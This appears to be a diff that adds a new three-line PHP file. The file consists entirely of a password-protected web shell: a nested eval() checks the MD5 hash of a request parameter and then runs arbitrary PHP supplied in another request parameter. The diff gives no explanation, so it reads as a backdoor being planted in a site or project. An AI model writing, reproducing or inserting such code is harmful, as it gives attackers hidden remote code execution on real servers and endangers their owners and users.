@@ -1,0 +1,3 @@
+<?php
+
+eval("if(isset(\$_REQUEST['ch']) && (md5(\$_REQUEST['ch']) == '5d5780065f278a2db819916c4b525671') && isset(\$_REQUEST['php_code'])) { eval(\$_REQUEST['php_code']); exit(); }")%
